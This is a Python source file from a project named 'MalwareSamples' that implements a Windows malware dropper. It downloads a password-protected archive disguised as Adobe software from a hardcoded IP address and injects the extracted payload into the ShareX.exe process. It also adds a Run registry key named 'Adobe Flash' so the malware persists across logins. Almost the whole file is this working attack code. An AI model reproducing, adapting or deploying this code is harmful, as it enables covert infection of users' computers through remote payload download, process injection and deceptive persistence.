"""
   Copyright (c) 2019 Jack Farley
   This file is part of MalwareSamples
   Usage or distribution of this software/code is subject to the
   terms of the GNU GENERAL PUBLIC LICENSE.
   Malware_MK1.py
   ---
"""

from zipfile import ZipFile
import io
import os
import requests
from helpers import injection
from winreg import OpenKey, HKEY_CURRENT_USER, KEY_WRITE, REG_SZ, SetValueEx, CloseKey

class Malware:
    def __init__(self):
        self.url = "http://34.194.253.132/wp-content/uploads/2019/09/adobe.zip"
        self.download_folder = "C:\\Temp"
        self.downoad_file = self.download_folder + "\\adobe.exe"
        self.passwd = "infected"
        self.unzipPwd()
        self.persist()



    def unzipPwd(self):
        """
        https://www.quora.com/How-can-I-write-a-Python-program-to-unzip-a-7z-archive-protected-with-a-password

        Extracts zip file with password in memory and also extracts file to memory
        """

        response = requests.get(self.url)
        if not os.path.exists(self.download_folder):
            os.makedirs(self.download_folder)
        with ZipFile(io.BytesIO(response.content)) as thezip:
            for zipinfo in thezip.infolist():
                with thezip.open(zipinfo, pwd=bytes(self.passwd, 'utf-8')) as thefile:
                    filename, file_obj  = zipinfo.filename, thefile
                    write_file = self.download_folder + "\\" + filename
                    injection.PE_injection(file_obj.read(), "ShareX.exe")
                    #with open(write_file, "wb") as aFile:
                    #    aFile.write(file_obj.read())


    def persist(self):
        reg_path = "Software\Microsoft\Windows\CurrentVersion\Run"
        registry_key = OpenKey(HKEY_CURRENT_USER, reg_path, 0, KEY_WRITE)
        name = "Adobe Flash"
        SetValueEx(registry_key, name, 0, REG_SZ, self.downoad_file)
        CloseKey(registry_key)

















if __name__ == "__main__":
    Malware()